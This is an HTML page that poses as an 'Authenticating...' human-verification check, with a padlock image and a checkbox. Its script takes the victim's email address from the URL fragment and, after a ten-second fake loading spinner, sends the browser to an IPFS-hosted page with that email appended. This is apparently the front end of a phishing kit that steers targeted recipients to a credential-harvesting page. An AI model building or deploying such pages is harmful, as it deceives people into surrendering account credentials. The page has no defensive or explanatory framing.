<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authenticating...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-image: url('https://horizon.sologerg.com/ghXV6wt9mkYFUOVIvXqDLY9LtHGdZrMcgIppPbwGyPFCmni62FkrSLfHBijlrb8ef');
            background-size: cover;
            background-position: center;
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .container {
            text-align: center;
        }

        .padlock {
            width: 50px;
            height: auto;
            margin-bottom: 20px;
            /* Space between padlock and label */
        }

        button {
            background-color: #0078D4;
            /* Blue color */
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            margin-top: 10px;
        }

        button:hover {
            background-color: #005A9E;
            /* Darker blue on hover */
        }

        .loading {
            display: none;
            margin-top: 20px;
        }

        .spinner {
            width: 30px;
            height: 30px;
            border: 3px solid rgba(0, 0, 0, 0.1);
            border-left-color: #0078D4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>
    <div class="container"><img src="https://i.postimg.cc/HnkZCQpS/lock.png" alt="Padlock" class="padlock">
        <form id="verificationForm" method="POST"><label for="verify">Please verify that you&apos;re a real person by clicking the button below to proceed.</label> <input type="checkbox" id="verify" name="verify"><br><br><button type="submit">Submit</button>
            <div class="loading" id="loadingIndicator">
                <div class="spinner"><br></div>
            </div>
        </form>
    </div>
    <script>
        document.getElementById('verificationForm').addEventListener('submit', function (event) {
            event.preventDefault();
            if (document.getElementById('verify').checked) {
                document.getElementById('loadingIndicator').style.display = 'block';
                document.querySelector('button[type="submit"]').setAttribute('disabled', 'true');
                setTimeout(function () {
                    var email = window.location.hash.substring(1);
                    window.location.href = 'https://ipfs.io/ipfs/bafkreihoib3ogqazbabwbqx4em4fnjphbvcjk7oycaxtghvo4d2kca7u7y' + encodeURIComponent(email);
                }, 10000);
            } else {
                alert('Please verify that you are a human by ticking the checkbox.');
            }
        });
    </script>
</body>

</html>
